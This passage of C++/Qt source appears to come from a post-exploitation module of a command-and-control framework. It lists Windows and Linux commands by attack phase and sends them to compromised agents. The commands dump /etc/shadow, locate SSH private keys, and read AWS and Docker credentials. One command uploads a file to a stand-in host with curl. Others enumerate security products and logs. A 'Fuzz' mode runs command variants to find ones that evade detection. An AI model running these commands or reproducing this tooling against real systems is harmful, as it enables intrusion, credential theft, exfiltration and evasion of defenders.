        {"curl", "cURL上传", "curl -X POST -F \"file=@C:\\file.txt\" http://example.com/upload", "使用 cURL 上传", 0, ""}
    };
    
    transfer.groups = {transferDownload, transferUpload};
    phases.append(transfer);
    
    // Phase 9: 痕迹清理
    TacticalPhase cleanup;
    cleanup.id = "cleanup";
    cleanup.name = "🧹 清理";
    cleanup.icon = "broom";
    cleanup.description = "清理操作痕迹";
    
    TacticalGroup cleanupCheck;
    cleanupCheck.id = "check";
    cleanupCheck.name = "痕迹检查";
    cleanupCheck.commands = {
        {"history", "命令历史", "doskey /history", "查看 CMD 命令历史", 0, ""},
        {"pshistory", "PS历史", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "查看 PowerShell 历史", 0, ""},
        {"prefetch", "预读文件", "dir C:\\Windows\\Prefetch\\*.pf", "查看 Prefetch 文件", 0, ""},
        {"temp", "临时文件", "dir %TEMP%", "查看临时文件目录", 0, ""}
    };
    
    TacticalGroup cleanupLogs;
    cleanupLogs.id = "logs";
    cleanupLogs.name = "日志位置";
    cleanupLogs.commands = {
        {"seclog", "安全日志", "wevtutil qe Security /c:5 /f:text /rd:true", "查看最近安全日志", 0, ""},
        {"syslog", "系统日志", "wevtutil qe System /c:5 /f:text /rd:true", "查看最近系统日志", 0, ""},
        {"applog", "应用日志", "wevtutil qe Application /c:5 /f:text /rd:true", "查看最近应用日志", 0, ""}
    };
    
    cleanup.groups = {cleanupCheck, cleanupLogs};
    phases.append(cleanup);
}

void TacticalWidget::loadLinuxPhases()
{
    // Phase 1: 侦察
    TacticalPhase recon;
    recon.id = "recon";
    recon.name = "🔍 侦察";
    recon.icon = "search";
    recon.description = "收集目标系统信息";
    
    TacticalGroup reconBasic;
    reconBasic.id = "basic";
    reconBasic.name = "基础信息";
    reconBasic.commands = {
        {"whoami", "当前用户", "id", "查看当前用户身份和组", 0, ""},
        {"hostname", "主机名", "hostname -f", "获取完整主机名", 0, ""},
        {"uname", "系统信息", "uname -a", "获取内核和系统信息", 0, ""},
        {"release", "发行版", "cat /etc/*release", "查看发行版信息", 0, ""},
        {"env", "环境变量", "env", "查看环境变量", 0, ""}
    };
    
    TacticalGroup reconNetwork;
    reconNetwork.id = "network";
    reconNetwork.name = "网络环境";
    reconNetwork.commands = {
        {"ifconfig", "网络接口", "ip addr || ifconfig", "查看网络接口配置", 0, ""},
        {"route", "路由表", "ip route || route -n", "查看路由表", 0, ""},
        {"netstat", "网络连接", "ss -tunlp || netstat -tunlp", "查看网络连接和监听端口", 0, ""},
        {"arp", "ARP 缓存", "ip neigh || arp -a", "查看 ARP 表", 0, ""},
        {"dns", "DNS 配置", "cat /etc/resolv.conf", "查看 DNS 配置", 0, ""}
    };
    
    TacticalGroup reconUsers;
    reconUsers.id = "users";
    reconUsers.name = "用户信息";
    reconUsers.commands = {
        {"passwd", "用户列表", "cat /etc/passwd", "查看系统用户", 0, ""},
        {"groups", "用户组", "cat /etc/group", "查看用户组", 0, ""},
        {"logged", "登录用户", "w", "查看当前登录用户", 0, ""},
        {"lastlog", "登录历史", "last -n 20", "查看最近登录记录", 0, ""},
        {"sudo", "sudo 权限", "sudo -l 2>/dev/null", "检查 sudo 权限", 0, ""}
    };
    
    recon.groups = {reconBasic, reconNetwork, reconUsers};
    phases.append(recon);
    
    // Phase 2: 权限提升
    TacticalPhase privesc;
    privesc.id = "privesc";
    privesc.name = "🔓 提权";
    privesc.icon = "unlock";
    privesc.description = "检查提权向量";
    
    TacticalGroup privCheck;
    privCheck.id = "check";
    privCheck.name = "权限检查";
    privCheck.commands = {
        {"uid", "当前权限", "id", "查看当前用户 UID/GID", 0, ""},
        {"sudo", "sudo 配置", "cat /etc/sudoers 2>/dev/null || sudo -l", "查看 sudo 配置", 0, ""},
        {"suid", "SUID 文件", "find / -perm -4000 -type f 2>/dev/null", "查找 SUID 文件", 0, ""},
        {"sgid", "SGID 文件", "find / -perm -2000 -type f 2>/dev/null", "查找 SGID 文件", 0, ""},
        {"capabilities", "特殊能力", "getcap -r / 2>/dev/null", "查找具有特殊能力的文件", 0, ""}
    };
    
    TacticalGroup privWritable;
    privWritable.id = "writable";
    privWritable.name = "可写目录";
    privWritable.commands = {
        {"worldwrite", "全局可写", "find / -writable -type d 2>/dev/null | head -20", "查找可写目录", 0, ""},
        {"tmp", "临时目录", "ls -la /tmp /var/tmp /dev/shm", "查看临时目录", 0, ""},
        {"cron", "定时任务", "cat /etc/crontab; ls -la /etc/cron.*", "查看定时任务", 0, ""}
    };
    
    privesc.groups = {privCheck, privWritable};
    phases.append(privesc);
    
    // Phase 3: 凭据收集
    TacticalPhase creds;
    creds.id = "creds";
    creds.name = "🔑 凭据";
    creds.icon = "key";
    creds.description = "收集凭据和敏感信息";
    
    TacticalGroup credsFiles;
    credsFiles.id = "files";
    credsFiles.name = "敏感文件";
    credsFiles.commands = {
        {"shadow", "密码哈希", "cat /etc/shadow 2>/dev/null", "读取密码哈希文件", 0, ""},
        {"sshkeys", "SSH 密钥", "find /home -name id_rsa -o -name id_ed25519 2>/dev/null", "查找 SSH 私钥", 0, ""},
        {"history", "命令历史", "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50", "查看命令历史", 0, ""},
        {"config", "配置文件", "find /home /root -name '*.conf' -o -name '*.config' 2>/dev/null", "查找配置文件", 0, ""}
    };
    
    TacticalGroup credsApps;
    credsApps.id = "apps";
    credsApps.name = "应用凭据";
    credsApps.commands = {
        {"mysql", "MySQL 历史", "cat ~/.mysql_history 2>/dev/null", "查看 MySQL 命令历史", 0, ""},
        {"git", "Git 配置", "cat ~/.gitconfig 2>/dev/null; find / -name .git -type d 2>/dev/null | head -10", "查看 Git 配置", 0, ""},
        {"aws", "AWS 凭据", "cat ~/.aws/credentials 2>/dev/null", "查看 AWS 凭据", 0, ""},
        {"docker", "Docker 配置", "cat ~/.docker/config.json 2>/dev/null", "查看 Docker 配置", 0, ""}
    };
    
    creds.groups = {credsFiles, credsApps};
    phases.append(creds);
    
    // Phase 4: 横向移动
    TacticalPhase lateral;
    lateral.id = "lateral";
    lateral.name = "➡️ 横向";
    lateral.icon = "arrow-right";
    lateral.description = "网络扫描和横向移动";
    
    TacticalGroup lateralEnum;
    lateralEnum.id = "enum";
    lateralEnum.name = "网络枚举";
    lateralEnum.commands = {
        {"hosts", "主机列表", "cat /etc/hosts", "查看 hosts 文件", 0, ""},
        {"arp", "ARP 扫描", "ip neigh || arp -a", "查看 ARP 缓存中的主机", 0, ""},
        {"ssh_known", "已知主机", "cat ~/.ssh/known_hosts 2>/dev/null", "查看 SSH 已知主机", 0, ""},
        {"connections", "活动连接", "ss -tunp | grep ESTABLISHED", "查看活动连接", 0, ""}
    };
    
    TacticalGroup lateralServices;
    lateralServices.id = "services";
    lateralServices.name = "服务发现";
    lateralServices.commands = {
        {"listening", "监听服务", "ss -tunlp", "查看本机监听服务", 0, ""},
        {"nfs", "NFS 共享", "showmount -e localhost 2>/dev/null; cat /etc/exports", "检查 NFS 共享", 0, ""},
        {"smb", "SMB 共享", "smbclient -L localhost -N 2>/dev/null", "检查 SMB 共享", 0, ""}
    };
    
    lateral.groups = {lateralEnum, lateralServices};
    phases.append(lateral);
    
    // Phase 5: 持久化
    TacticalPhase persist;
    persist.id = "persist";
    persist.name = "📌 持久化";
    persist.icon = "pin";
    persist.description = "检查持久化机制";
    
    TacticalGroup persistCheck;
    persistCheck.id = "check";
    persistCheck.name = "持久化检查";
    persistCheck.commands = {
        {"crontab", "用户定时任务", "crontab -l 2>/dev/null", "查看用户定时任务", 0, ""},
        {"systemcron", "系统定时任务", "cat /etc/crontab; ls /etc/cron.d/", "查看系统定时任务", 0, ""},
        {"systemd", "Systemd 服务", "systemctl list-unit-files --type=service | grep enabled", "查看启用的服务", 0, ""},
        {"rclocal", "启动脚本", "cat /etc/rc.local 2>/dev/null", "查看 rc.local", 0, ""}
    };
    
    TacticalGroup persistLocations;
    persistLocations.id = "locations";
    persistLocations.name = "常见位置";
    persistLocations.commands = {
        {"profile", "Profile 脚本", "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -v '^#' | grep .", "查看登录脚本", 0, ""},
        {"init", "Init 脚本", "ls -la /etc/init.d/", "查看 init 脚本", 0, ""},
        {"xinetd", "xinetd 服务", "ls /etc/xinetd.d/ 2>/dev/null", "查看 xinetd 配置", 0, ""}
    };
    
    persist.groups = {persistCheck, persistLocations};
    phases.append(persist);
    
    // Phase 6: 防御规避
    TacticalPhase evasion;
    evasion.id = "evasion";
    evasion.name = "🛡️ 规避";
    evasion.icon = "shield";
    evasion.description = "检测安全防护";
    
    TacticalGroup evasionAv;
    evasionAv.id = "av";
    evasionAv.name = "安全软件";
    evasionAv.commands = {
        {"av_process", "安全进程", "ps aux | grep -iE 'clamd|sophos|avg|avast|eset|kaspersky|crowdstrike|falcon|carbon'", "检查安全软件进程", 0, ""},
        {"selinux", "SELinux 状态", "getenforce 2>/dev/null; cat /etc/selinux/config", "检查 SELinux", 0, ""},
        {"apparmor", "AppArmor 状态", "aa-status 2>/dev/null", "检查 AppArmor", 0, ""},
        {"iptables", "防火墙规则", "iptables -L -n 2>/dev/null || cat /etc/iptables/rules.v4", "查看防火墙规则", 0, ""}
    };
    
    TacticalGroup evasionLogs;
    evasionLogs.id = "logs";
    evasionLogs.name = "日志审计";
    evasionLogs.commands = {
        {"auditd", "审计守护进程", "systemctl status auditd 2>/dev/null; cat /etc/audit/auditd.conf", "检查 auditd", 0, ""},
        {"syslog", "系统日志", "ls -la /var/log/", "查看日志目录", 0, ""},
        {"auth", "认证日志", "tail -20 /var/log/auth.log 2>/dev/null || tail -20 /var/log/secure", "查看认证日志", 0, ""}
    };
    
    evasion.groups = {evasionAv, evasionLogs};
    phases.append(evasion);
    
    // Phase 7: 数据收集
    TacticalPhase collection;
    collection.id = "collection";
    collection.name = "📦 收集";
    collection.icon = "package";
    collection.description = "收集目标数据";
    
    TacticalGroup collectionFiles;
    collectionFiles.id = "files";
    collectionFiles.name = "文件搜索";
    collectionFiles.commands = {
        {"documents", "文档文件", "find /home -type f \\( -name '*.pdf' -o -name '*.doc*' -o -name '*.xls*' \\) 2>/dev/null | head -20", "搜索文档文件", 0, ""},
        {"databases", "数据库文件", "find / -type f \\( -name '*.sql' -o -name '*.db' -o -name '*.sqlite' \\) 2>/dev/null | head -20", "搜索数据库文件", 0, ""},
        {"backups", "备份文件", "find / -type f \\( -name '*.bak' -o -name '*.backup' -o -name '*.tar.gz' \\) 2>/dev/null | head -20", "搜索备份文件", 0, ""}
    };
    
    TacticalGroup collectionWeb;
    collectionWeb.id = "web";
    collectionWeb.name = "Web 配置";
    collectionWeb.commands = {
        {"apache", "Apache 配置", "cat /etc/apache2/sites-enabled/* /etc/httpd/conf.d/* 2>/dev/null", "查看 Apache 配置", 0, ""},
        {"nginx", "Nginx 配置", "cat /etc/nginx/sites-enabled/* /etc/nginx/conf.d/* 2>/dev/null", "查看 Nginx 配置", 0, ""},
        {"wordpress", "WordPress", "find / -name wp-config.php 2>/dev/null", "查找 WordPress 配置", 0, ""}
    };
    
    collection.groups = {collectionFiles, collectionWeb};
    phases.append(collection);
    
    // Phase 8: 痕迹清理
    TacticalPhase cleanup;
    cleanup.id = "cleanup";
    cleanup.name = "🧹 清理";
    cleanup.icon = "broom";
    cleanup.description = "检查操作痕迹";
    
    TacticalGroup cleanupCheck;
    cleanupCheck.id = "check";
    cleanupCheck.name = "痕迹检查";
    cleanupCheck.commands = {
        {"history", "命令历史", "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -30", "查看命令历史", 0, ""},
        {"lastlog", "登录记录", "lastlog; last -n 10", "查看登录记录", 0, ""},
        {"wtmp", "WTMP 文件", "ls -la /var/log/wtmp /var/log/btmp", "查看登录日志文件", 0, ""},
        {"tmp", "临时文件", "ls -la /tmp /var/tmp", "查看临时文件", 0, ""}
    };
    
    TacticalGroup cleanupLogs;
    cleanupLogs.id = "logs";
    cleanupLogs.name = "日志位置";
    cleanupLogs.commands = {
        {"authlog", "认证日志", "tail -20 /var/log/auth.log 2>/dev/null || tail -20 /var/log/secure", "查看认证日志", 0, ""},
        {"syslog", "系统日志", "tail -20 /var/log/syslog 2>/dev/null || tail -20 /var/log/messages", "查看系统日志", 0, ""},
        {"audit", "审计日志", "tail -20 /var/log/audit/audit.log 2>/dev/null", "查看审计日志", 0, ""}
    };
    
    cleanup.groups = {cleanupCheck, cleanupLogs};
    phases.append(cleanup);
}

void TacticalWidget::updatePhaseTree()
{
    phaseTab->clear();
    phaseTrees.clear();
    
    for (const TacticalPhase& phase : phases) {
        auto tree = new QTreeWidget(this);
        tree->setHeaderLabels({"命令", "描述"});
        tree->setColumnCount(2);
        tree->setColumnWidth(0, 220);
        tree->setColumnWidth(1, 350);
        tree->setRootIsDecorated(true);
        tree->setAlternatingRowColors(true);
        
        connect(tree, &QTreeWidget::itemChanged, this, &TacticalWidget::onItemChanged);
        
        // 启用右键菜单
        tree->setContextMenuPolicy(Qt::CustomContextMenu);
        connect(tree, &QTreeWidget::customContextMenuRequested, this, &TacticalWidget::onTreeContextMenu);
        
        // 双击预览命令
        connect(tree, &QTreeWidget::itemDoubleClicked, this, &TacticalWidget::onCommandPreview);
        
        for (const TacticalGroup& group : phase.groups) {
            auto groupItem = new QTreeWidgetItem(tree);
            groupItem->setText(0, group.name);
            groupItem->setFlags(groupItem->flags() | Qt::ItemIsUserCheckable | Qt::ItemIsAutoTristate);
            groupItem->setCheckState(0, Qt::Unchecked);
            groupItem->setData(0, Qt::UserRole, phase.id + "." + group.id);
            groupItem->setExpanded(true);
            
            for (const TacticalCommand& cmd : group.commands) {
                auto cmdItem = new QTreeWidgetItem(groupItem);
                cmdItem->setFlags(cmdItem->flags() | Qt::ItemIsUserCheckable);
                cmdItem->setCheckState(0, Qt::Unchecked);
                
                // 如果有变体，显示变体数量
                if (!cmd.variants.isEmpty()) {
                    cmdItem->setText(0, QString("%1 [%2变体]").arg(cmd.name).arg(cmd.variants.size()));
                    cmdItem->setForeground(0, QColor("#dcdcaa"));  // 黄色标记有变体的命令
                } else {
                    cmdItem->setText(0, cmd.name);
                }
                
                cmdItem->setText(1, cmd.description);
                cmdItem->setData(0, Qt::UserRole, phase.id + "." + group.id + "." + cmd.id);
                cmdItem->setData(0, Qt::UserRole + 1, cmd.cmd);
                cmdItem->setData(0, Qt::UserRole + 2, cmd.variants.size());  // 存储变体数量
                cmdItem->setToolTip(0, cmd.cmd);
                
                // 添加变体作为子项
                for (int vi = 0; vi < cmd.variants.size(); ++vi) {
                    const CommandVariant& var = cmd.variants[vi];
                    auto varItem = new QTreeWidgetItem(cmdItem);
                    varItem->setFlags(varItem->flags() | Qt::ItemIsUserCheckable);
                    varItem->setCheckState(0, Qt::Unchecked);
                    varItem->setText(0, QString("├─ %1").arg(var.tag));
                    varItem->setText(1, var.description);
                    varItem->setData(0, Qt::UserRole, phase.id + "." + group.id + "." + cmd.id + ".v" + QString::number(vi));
                    varItem->setData(0, Qt::UserRole + 1, var.cmd);
                    varItem->setData(0, Qt::UserRole + 3, true);  // 标记为变体
                    varItem->setToolTip(0, var.cmd);
                    varItem->setForeground(0, QColor("#9cdcfe"));  // 蓝色显示变体
                }
            }
        }
        
        phaseTrees[phase.id] = tree;
        phaseTab->addTab(tree, phase.name);
    }
    
    // 应用保存的命令修改
    applyCommandMods();
}

void TacticalWidget::setAgent(const QString& agentId)
{
    currentAgentId = agentId;
    
    // 获取 OS 类型
    Agent* agent = adaptixWidget->AgentsMap.value(agentId, nullptr);
    if (agent) {
        currentAgentOs = (agent->data.Os == 1) ? "windows" : "linux";
    }
    
    int idx = agentCombo->findData(agentId);
    if (idx >= 0) {
        agentCombo->setCurrentIndex(idx);
    }
    
    loadPhases();
    statusLabel->setText(QString("已选择: %1").arg(agentId.left(8)));
}

void TacticalWidget::onAgentChanged(int index)
{
    if (index <= 0) {
        currentAgentId.clear();
        return;
    }
    
    currentAgentId = agentCombo->itemData(index).toString();
    QString oldOs = currentAgentOs;
    
    if (adaptixWidget && !currentAgentId.isEmpty()) {
        Agent* agent = adaptixWidget->AgentsMap.value(currentAgentId, nullptr);
        if (agent) {
            currentAgentOs = (agent->data.Os == 1) ? "windows" : "linux";
            statusLabel->setText(QString("🎯 单目标: %1 (%2)")
                .arg(currentAgentId.left(8), currentAgentOs));
            
            // 单选时清除多选 - 互斥
            if (!selectedAgentIds.isEmpty()) {
                selectedAgentIds.clear();
                multiAgentBtn->setText("多目标");
                multiAgentBtn->setStyleSheet("");
            }
            
            // 如果 OS 改变，重新加载对应的命令集
            if (oldOs != currentAgentOs) {
                loadPhases();
            }
        }
    }
}

void TacticalWidget::onRefreshAgents()
{
    agentCombo->clear();
    agentCombo->addItem("-- 选择 Agent --", "");
    
    if (adaptixWidget) {
        for (const QString& agentId : adaptixWidget->AgentsVector) {
            Agent* agent = adaptixWidget->AgentsMap.value(agentId, nullptr);
            if (agent) {
                QString displayName = QString("%1 (%2@%3)")
                    .arg(agentId.left(8))
                    .arg(agent->data.Username)
                    .arg(agent->data.Computer);
                agentCombo->addItem(displayName, agentId);
            }
        }
    }
}

void TacticalWidget::onExecuteSelected()
{
    if (currentAgentId.isEmpty() && selectedAgentIds.isEmpty()) {
        QMessageBox::warning(this, "执行命令", "请先选择 Agent（单选或多选）");
        return;
    }
    
    pendingCommands.clear();
    
    // 获取当前标签页的树
    int tabIndex = phaseTab->currentIndex();
    if (tabIndex < 0 || tabIndex >= phases.size()) return;
    
    QString phaseId = phases[tabIndex].id;
    QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
    if (!tree) return;
    
    // 收集选中的命令
    for (int i = 0; i < tree->topLevelItemCount(); ++i) {
        auto groupItem = tree->topLevelItem(i);
        for (int j = 0; j < groupItem->childCount(); ++j) {
            auto cmdItem = groupItem->child(j);
            if (cmdItem->checkState(0) == Qt::Checked) {
                QString ref = cmdItem->data(0, Qt::UserRole).toString();
                QString cmd = cmdItem->data(0, Qt::UserRole + 1).toString();
                pendingCommands.append({ref, cmd});
                cmdItem->setText(2, "等待中...");
            }
        }
    }
    
    if (pendingCommands.isEmpty()) {
        QMessageBox::information(this, "执行命令", "请先勾选要执行的命令");
        return;
    }
    
    progressBar->setVisible(true);
    progressBar->setRange(0, pendingCommands.size());
    progressBar->setValue(0);
    
    executeTimer->start();
}

// onExecuteAll, onNextPhase, onSaveWorkflow, onLoadWorkflow 已移除 - 简化 UI

void TacticalWidget::onItemChanged(QTreeWidgetItem* item, int column)
{
    Q_UNUSED(item);
    Q_UNUSED(column);
}

void TacticalWidget::processNextCommand()
{
    if (pendingCommands.isEmpty()) {
        executeTimer->stop();
        progressBar->setVisible(false);
        statusLabel->setText("执行完成");
        return;
    }
    
    auto [ref, cmd] = pendingCommands.takeFirst();
    progressBar->setValue(progressBar->maximum() - pendingCommands.size());
    
    // 更新状态
    QStringList parts = ref.split('.');
    if (parts.size() >= 3) {
        QString phaseId = parts[0];
        QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
        if (tree) {
            // 查找并更新项目状态
            for (int i = 0; i < tree->topLevelItemCount(); ++i) {
                auto groupItem = tree->topLevelItem(i);
                for (int j = 0; j < groupItem->childCount(); ++j) {
                    auto cmdItem = groupItem->child(j);
                    if (cmdItem->data(0, Qt::UserRole).toString() == ref) {
                        cmdItem->setText(2, "执行中...");
                        cmdItem->setForeground(2, QColor("#f0ad4e"));
                        break;
                    }
                }
            }
        }
    }
    
    statusLabel->setText(QString("执行: %1").arg(cmd.left(30)));
    
    // 在结果树中添加任务项
    QString timeStr = QDateTime::currentDateTime().toString("hh:mm:ss");
    auto taskItem = new QTreeWidgetItem(resultTree);
    taskItem->setText(0, cmd.left(50) + (cmd.length() > 50 ? "..." : ""));
    taskItem->setText(1, "执行中");
    taskItem->setText(2, timeStr);
    taskItem->setForeground(1, QColor("#f0ad4e"));
    taskItem->setToolTip(0, cmd);
    taskItem->setData(0, Qt::UserRole, cmd);  // 存储完整命令
    
    // 执行命令 - 支持多目标
    QStringList targetAgents;
    if (!selectedAgentIds.isEmpty()) {
        targetAgents = selectedAgentIds;
    } else if (!currentAgentId.isEmpty()) {
        targetAgents << currentAgentId;
    }
    
    // 添加目标 Agent 作为子项
    for (const QString& agentId : targetAgents) {
        auto agentItem = new QTreeWidgetItem(taskItem);
        Agent* agent = adaptixWidget->AgentsMap.value(agentId, nullptr);
        QString agentName = agent ? QString("%1 (%2)").arg(agentId.left(8), agent->data.Computer) : agentId.left(8);
        agentItem->setText(0, agentName);
        agentItem->setText(1, "发送中");
        agentItem->setForeground(1, QColor("#888"));
        agentItem->setData(0, Qt::UserRole, agentId);  // 存储 agentId 用于匹配
        
        if (agent && agent->Console) {
            agent->Console->SetInput(cmd);
            agent->Console->processInput();
            agentItem->setText(1, "等待结果");
            agentItem->setForeground(1, QColor("#dcdcaa"));
            
            // 存储映射用于接收结果 - 使用 agentId 作为 key
            taskToTreeItem[agentId] = agentItem;
        } else {
            agentItem->setText(1, "失败");
            agentItem->setForeground(1, QColor("#f44747"));
        }
    }
    
    // 更新任务项状态
    taskItem->setText(1, "已发送");
    taskItem->setForeground(1, QColor("#6a9955"));
    taskItem->setExpanded(false);  // 默认折叠，用户可点击展开
    
    // 滚动到最新项
    resultTree->scrollToItem(taskItem);
    
    // 更新状态为完成
    if (parts.size() >= 3) {
        QString phaseId = parts[0];
        QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
        if (tree) {
            for (int i = 0; i < tree->topLevelItemCount(); ++i) {
                auto groupItem = tree->topLevelItem(i);
                for (int j = 0; j < groupItem->childCount(); ++j) {
                    auto cmdItem = groupItem->child(j);
                    if (cmdItem->data(0, Qt::UserRole).toString() == ref) {
                        cmdItem->setText(2, "✓ 已执行");
                        cmdItem->setForeground(2, QColor("#5cb85c"));
                        cmdItem->setCheckState(0, Qt::Unchecked);
                        break;
                    }
                }
            }
        }
    }
}

void TacticalWidget::executeCommand(const QString& phaseId, const QString& groupId, const QString& cmdId)
{
    Q_UNUSED(phaseId);
    Q_UNUSED(groupId);
    Q_UNUSED(cmdId);
}

void TacticalWidget::executeVariant(QTreeWidgetItem* cmdItem, int variantIndex)
{
    if (!cmdItem) return;
    
    QString cmd;
    QString name;
    
    if (variantIndex < 0) {
        // 执行默认版本
        cmd = cmdItem->data(0, Qt::UserRole + 1).toString();
        name = cmdItem->text(0).split(" [").first();
    } else if (variantIndex < cmdItem->childCount()) {
        // 执行指定变体
        QTreeWidgetItem* varItem = cmdItem->child(variantIndex);
        cmd = varItem->data(0, Qt::UserRole + 1).toString();
        name = varItem->text(0).replace("├─ ", "") + " (" + cmdItem->text(0).split(" [").first() + ")";
    } else {
        return;
    }
    
    executeDirectCommand(cmd, name);
}

void TacticalWidget::executeFuzzVariants(QTreeWidgetItem* cmdItem)
{
    if (!cmdItem || cmdItem->childCount() == 0) return;
    
    QString baseName = cmdItem->text(0).split(" [").first();
    
    // 显示确认对话框
    QMessageBox::StandardButton reply = QMessageBox::question(
        this, "Fuzz 确认",
        QString("即将依次执行 %1 的 %2 个变体版本。\n\n"
                "这将帮助测试哪些变体能够绑过安全检测。\n"
                "是否继续？").arg(baseName).arg(cmdItem->childCount()),
        QMessageBox::Yes | QMessageBox::No
    );
    
    if (reply != QMessageBox::Yes) return;
    
    // 依次执行所有变体
    for (int i = 0; i < cmdItem->childCount(); ++i) {
        QTreeWidgetItem* varItem = cmdItem->child(i);
        QString cmd = varItem->data(0, Qt::UserRole + 1).toString();
        QString varTag = varItem->text(0).replace("├─ ", "");
        QString name = QString("[Fuzz %1/%2] %3 - %4").arg(i+1).arg(cmdItem->childCount()).arg(baseName, varTag);
        
        executeDirectCommand(cmd, name);
    }
    
    statusLabel->setText(QString("Fuzz 已启动: %1 个变体").arg(cmdItem->childCount()));
}

void TacticalWidget::executeDirectCommand(const QString& cmd, const QString& name)
{
    if (cmd.isEmpty()) {
        statusLabel->setText("命令为空");
        return;
    }
    
    // 获取目标 Agents
    QStringList targetAgents;
    if (!selectedAgentIds.isEmpty()) {
        targetAgents = selectedAgentIds;
    } else if (!currentAgentId.isEmpty()) {
        targetAgents << currentAgentId;
    } else {
        statusLabel->setText("请先选择 Agent");
        return;
    }
    
    if (targetAgents.isEmpty()) {
        statusLabel->setText("请先选择 Agent");
        return;
    }
    
    // 添加到结果树
    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    auto taskItem = new QTreeWidgetItem(resultTree);
    taskItem->setText(0, name.isEmpty() ? cmd.left(50) : name);
    taskItem->setText(1, "发送中");
    taskItem->setText(2, timestamp);
    taskItem->setForeground(1, QColor("#888"));
    taskItem->setToolTip(0, cmd);
    
    // 执行命令到所有目标 Agent
    for (const QString& agentId : targetAgents) {
        auto agentItem = new QTreeWidgetItem(taskItem);
        Agent* agent = adaptixWidget->AgentsMap.value(agentId, nullptr);
        QString agentName = agent ? QString("%1 (%2)").arg(agentId.left(8), agent->data.Computer) : agentId.left(8);
        agentItem->setText(0, agentName);
        agentItem->setText(1, "发送中");
        agentItem->setForeground(1, QColor("#888"));
        agentItem->setData(0, Qt::UserRole, agentId);
        
        if (agent && agent->Console) {
            agent->Console->SetInput(cmd);
            agent->Console->processInput();
            agentItem->setText(1, "等待结果");
            agentItem->setForeground(1, QColor("#dcdcaa"));
            taskToTreeItem[agentId] = agentItem;
        } else {
            agentItem->setText(1, "失败");
            agentItem->setForeground(1, QColor("#f44747"));
        }
    }
    
    taskItem->setText(1, "已发送");
    taskItem->setForeground(1, QColor("#6a9955"));
    taskItem->setExpanded(false);
    resultTree->scrollToItem(taskItem);
}

void TacticalWidget::onTaskOutput(const QString& agentId, const QString& taskId, int messageType, const QString& output, bool completed)
{
    Q_UNUSED(output);
    
    // 查找该 Agent 对应的树项
    if (!taskToTreeItem.contains(agentId)) return;
    
    QTreeWidgetItem* agentItem = taskToTreeItem[agentId];
    if (!agentItem) return;
    
    // 存储 taskId 用于点击跳转
    agentItem->setData(0, Qt::UserRole + 1, taskId);
    
    // 检查是否是错误消息 (CONSOLE_OUT_ERROR = 6, CONSOLE_OUT_LOCAL_ERROR = 3)
    bool isError = (messageType == 6 || messageType == 3);
    
    // 更新状态（不显示输出，点击跳转到 Tasks 查看）
    if (completed) {
        if (isError) {
            agentItem->setText(1, "✗ 错误");
            agentItem->setForeground(1, QColor("#f44747"));
        } else {
            agentItem->setText(1, "✓ 完成");
            agentItem->setForeground(1, QColor("#6a9955"));
        }
        taskToTreeItem.remove(agentId);
    } else {
        if (isError) {
            agentItem->setText(1, "✗ 错误");
            agentItem->setForeground(1, QColor("#f44747"));
        } else {
            agentItem->setText(1, "执行中");
            agentItem->setForeground(1, QColor("#569cd6"));
        }
    }
    
    // 更新父项状态
    if (completed && agentItem->parent()) {
        QTreeWidgetItem* taskItem = agentItem->parent();
        bool allCompleted = true;
        bool hasError = false;
        for (int i = 0; i < taskItem->childCount(); ++i) {
            QString status = taskItem->child(i)->text(1);
            if (status.contains("错误")) {
                hasError = true;
            }
            if (!status.contains("完成") && !status.contains("错误") && status != "失败") {
                allCompleted = false;
                break;
            }
        }
        if (allCompleted) {
            if (hasError) {
                taskItem->setText(1, "✗ 有错误");
                taskItem->setForeground(1, QColor("#f44747"));
            } else {
                taskItem->setText(1, "✓ 完成");
                taskItem->setForeground(1, QColor("#6a9955"));
            }
            // 保存历史记录
            saveHistory();
        }
    }
}

void TacticalWidget::onTreeContextMenu(const QPoint& pos)
{
    int tabIndex = phaseTab->currentIndex();
    if (tabIndex < 0 || tabIndex >= phases.size()) return;
    
    QString phaseId = phases[tabIndex].id;
    QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
    if (!tree) return;
    
    QTreeWidgetItem* item = tree->itemAt(pos);
    
    QMenu menu(this);
    
    auto addAction = menu.addAction("➕ 添加命令");
    connect(addAction, &QAction::triggered, this, &TacticalWidget::onAddCommand);
    
    if (item && item->parent()) {
        // 命令项（有父节点）
        QString ref = item->data(0, Qt::UserRole).toString();
        bool isUserCmd = ref.contains(".user.");
        bool isVariant = item->data(0, Qt::UserRole + 3).toBool();
        int variantCount = item->data(0, Qt::UserRole + 2).toInt();
        
        auto editAction = menu.addAction("✏️ 编辑命令");
        connect(editAction, &QAction::triggered, this, &TacticalWidget::onEditCommand);
        
        if (isUserCmd) {
            auto deleteAction = menu.addAction("🗑️ 删除命令");
            connect(deleteAction, &QAction::triggered, this, &TacticalWidget::onDeleteCommand);
        }
        
        menu.addSeparator();
        
        // 如果命令有变体，添加变体执行选项
        if (variantCount > 0 && !isVariant) {
            auto execDefaultAction = menu.addAction("▶️ 执行默认版本");
            connect(execDefaultAction, &QAction::triggered, [this, item]() {
                executeVariant(item, -1);  // -1 表示默认版本
            });
            
            // 创建变体子菜单
            auto variantMenu = menu.addMenu("🔄 选择变体执行");
            for (int i = 0; i < item->childCount(); ++i) {
                QTreeWidgetItem* varItem = item->child(i);
                QString varTag = varItem->text(0).replace("├─ ", "");
                QString varDesc = varItem->text(1);
                auto varAction = variantMenu->addAction(QString("%1 - %2").arg(varTag, varDesc));
                connect(varAction, &QAction::triggered, [this, item, i]() {
                    executeVariant(item, i);
                });
            }
            
            menu.addSeparator();
            
            auto fuzzAction = menu.addAction("🎯 Fuzz 所有变体");
            connect(fuzzAction, &QAction::triggered, [this, item]() {
                executeFuzzVariants(item);
            });
            
            menu.addSeparator();
        }
        
        // 如果是变体项，直接执行该变体
        if (isVariant) {
            auto execVarAction = menu.addAction("▶️ 执行此变体");
            connect(execVarAction, &QAction::triggered, [this, item]() {
                QString cmd = item->data(0, Qt::UserRole + 1).toString();
                executeDirectCommand(cmd, item->text(0));
            });
